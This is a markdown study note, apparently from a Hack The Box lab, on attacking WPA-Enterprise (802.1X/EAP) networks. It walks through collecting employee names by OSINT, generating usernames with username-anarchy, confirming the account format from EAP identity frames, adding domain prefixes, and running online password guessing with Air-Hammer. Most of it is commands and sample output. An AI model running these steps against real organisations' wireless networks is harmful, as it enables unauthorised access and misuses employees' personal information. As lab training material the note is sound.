# Chain #15: Username Generation for WPA‑Enterprise

## Goal & Scope

Build high‑quality username lists for **WPA‑Enterprise (802.1X/EAP)** attacks:

- Gather names via OSINT (social media, metadata).
    
- Generate permutations with **username‑anarchy** (formats, countries, recognition).
    
- Confirm account format from EAP **Response/Identity** frames.
    
- Normalize usernames with domain prefix for attack tools.
    
- Execute online auth attempts with **Air‑Hammer**.
    

---

## Step 1 — Recon: Collect Names

**Social media mining** (e.g., LinkedIn) and **metadata extraction** (e.g., FOCA) reveal real‑world names used by the org. Save them to a plain list (e.g., `user-names.txt`).

---

## Step 2 — Generate Usernames (username‑anarchy)

Produce permutations from a name:

```bash
./username-anarchy David Smith
```

Sample output:

```
david
davidsmith
david.smith
…
dsmith
smith.david
```

List all supported formats:

```bash
./username-anarchy --list-formats
```

You’ll see plugin names like `first.last`, `f.last`, `lastf`, etc.

Generate by country conventions (plus common given/surnames):

```bash
./username-anarchy --country france --auto
```

Recognize an existing username’s format:

```bash
./username-anarchy --recognise j.smith
# → Plugin name: f.last
```

---

## Step 3 — Confirm Format from EAP Identity

Capture the EAP handshake (e.g., with a targeted connection attempt) and inspect in Wireshark. Look for **EAP → Response, Identity** to find `DOMAIN\username` (e.g., `HTB\cindy.walker`). Then:

```bash
./username-anarchy --recognise cindy.walker
# → Plugin name: first.last
```

Now you know the canonical format to use.

---

## Step 4 — Normalize an Entire List to One Format

Convert a raw names list into the identified format:

```bash
./username-anarchy --input-file ./user-names.txt --select-format first.last
# → sophia.rose, cindy.walker, …
```

Save to `usernames.txt`.

Prepend the **domain** (required by many WPA‑Enterprise realms):

```bash
#!/bin/bash
input_file="usernames.txt"
output_file="formatted_usernames.txt"
domain="HTB"
while IFS= read -r line; do
  echo "${domain}\\${line}" >> "$output_file"
done < "$input_file"
```

This produces lines like `HTB\sophia.rose` for attack tools.

---

## Step 5 — Perform Online Auth Attempts (Air‑Hammer)

Run against an SSID with your username list and a password wordlist:

```bash
python2 /opt/air-hammer/air-hammer.py \
  -i wlan1 -e HTB-Corp \
  -p /opt/wordlist.txt \
  -u formatted_usernames.txt
```

Target a specific user:

```bash
echo "HTB\sophia.rose" > user.txt
python2 /opt/air-hammer/air-hammer.py -i wlan1 -e HTB-Corp -p /opt/wordlist.txt -u user.txt
```

**Tip:** Use a **throttled** wordlist and respect legal/engagement constraints. Online attacks are noisy.

---

## Checklist

1. Mine names via OSINT and file metadata → `user-names.txt`.
    
2. Use `--recognise` or EAP Identity to confirm format.
    
3. Generate permutations with username‑anarchy; normalize with `--select-format`.
    
4. Prepend `DOMAIN\` to each username.
    
5. Test with Air‑Hammer (or similar EAP attack tooling).
    
